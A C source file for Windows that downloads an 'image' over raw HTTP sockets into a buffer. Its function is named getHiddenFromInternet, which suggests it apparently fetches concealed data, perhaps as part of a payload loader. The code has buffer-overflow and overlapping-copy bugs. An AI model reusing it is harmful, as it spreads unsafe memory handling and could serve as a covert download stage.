#include "download.h"


#define RESPONSE_MAX_SZ 1024

#define RESPONSE_SIGNATURE "HTTP"
#define RESPONSE_SIGNATURE_SZ 4
#define CONTENT_LENGTH "Content-Length: "
#define CONTENT_LENGTH_SZ 16
#define END_LINE "\r\n"
#define END_LINE_SZ 2
#define END_MESSAGE "\r\n\r\n"
#define END_MESSAGE_SZ 4
#define END_STRING "\0"
#define END_STRING_SZ 1



// HTTP message creation
void fillMes(char* buf, char* website, char* path)
{
	strcpy(buf, "");
	strcat(buf,"GET ");
	strcat(buf, path);
	strcat(buf," HTTP/1.1\r\n");
	strcat(buf,"Host: ");
	strcat(buf, website);
	strcat(buf,"\r\n");
	strcat(buf,"\r\n");
}


// Get image size
long getContentLen(char* mes)
{
	long i = 0;
	long j = 0;
	char retBuf[10] = "";
	long ret;

	// HTTP message checking
	if(memcmp(mes, RESPONSE_SIGNATURE, RESPONSE_SIGNATURE_SZ) != 0)
		return -1;


	while(memcmp(mes + i, END_MESSAGE, END_MESSAGE_SZ) != 0 && memcmp(mes + i, END_STRING, END_STRING_SZ) != 0)
	{
		if(memcmp(mes + i, CONTENT_LENGTH, CONTENT_LENGTH_SZ) == 0)
		{
			i += CONTENT_LENGTH_SZ;

			while(memcmp(mes + i, END_LINE, END_LINE_SZ) != 0)
			{
				memcpy(retBuf + j, mes + i, 1);
				j++;
				i++;
				if(j >= 9)
					return -1;
			}
			ret = atol(retBuf);
			if(ret == 0)
				return -1;
			else
				return ret;
		}
		if(i>RESPONSE_MAX_SZ)
			return -1;
		i++;
	}

	// We don't have the size
	return -1;
}



// Get image offset in the message
long getImageOffset(char* mes, long mesLen)
{
	long i = 0;

	for(i=0; i<mesLen; i++)
	{
		if(memcmp(mes+i, END_MESSAGE, END_MESSAGE_SZ) == 0)
			return (i + END_MESSAGE_SZ);
	}
	return -1;
}


BOOL getHiddenFromInternet(char*h, long* hLen, char* argWebsite, char* argPath)
{
	char addr[32];
	WSADATA wsa;
	struct addrinfo *hosterInf;
	SOCKET sock;
	void *ptr;
	SOCKADDR_IN inf;
	ULONG len;
	long contentOffset;
	long imageOffset;

	char website[WEBSITE_MAX_SIZE] = "";
	char path[PATH_MAX_SIZE] = "";

	if(argWebsite == NULL)
		strcpy(website, WEBSITE);
	else
		strcpy(website, argWebsite);
	if(argPath == NULL)
		strcpy(path, WEBISTE_RESSOURCE_PATH);
	else
		strcpy(path, argPath);

	// socket and buffer initialisation
	fillMes(h, website, path);
	if(WSAStartup(MAKEWORD(2,2), &wsa) != 0)	
		return FALSE;
	sock = socket(AF_INET,SOCK_STREAM,0);	
	if (sock == INVALID_SOCKET)
		return FALSE;

	// Get IP address of the server
	memset(&hosterInf, 0, sizeof(hosterInf));
	if((getaddrinfo(website, NULL, NULL, &hosterInf)) != 0)
		return FALSE;

	ptr = &((struct sockaddr_in *)hosterInf->ai_addr)->sin_addr;
	InetNtopA(hosterInf->ai_family, ptr, addr, 100);


	inf.sin_family=AF_INET;
	inf.sin_addr.s_addr = inet_addr(addr);
	inf.sin_port=htons(80);
	if(connect(sock, (struct sockaddr*)&inf, sizeof(inf)) == -1)
		return FALSE;

	if(send(sock, h, strlen(h), NULL) == SOCKET_ERROR)	
		return FALSE;


	// Get response
	if((len = recv(sock, h, HIDDEN_MAX_SIZE, MSG_WAITALL)) == SOCKET_ERROR)
		return FALSE;

	memcpy(h+len, "\0", 1);

	// Get image size
	(*hLen) = getContentLen(h);
	if((*hLen) == -1 || (*hLen) > HIDDEN_MAX_SIZE)
		return FALSE;

	// Get image offset
	imageOffset = getImageOffset(h, len);
	if(imageOffset == -1)
		return FALSE;

	contentOffset = len - imageOffset;


	// Remove beggining
	memcpy(h, h+imageOffset, contentOffset);

	// Download image
	while(contentOffset < (*hLen))
	{
		if((contentOffset += recv(sock, h + contentOffset, (*hLen)-contentOffset, MSG_WAITALL)) == SOCKET_ERROR)
		{
			closesocket(sock);
			return FALSE;
		}
	}
	memcpy(h + (*hLen), "\0", 1);

	closesocket(sock);
	return TRUE;
}
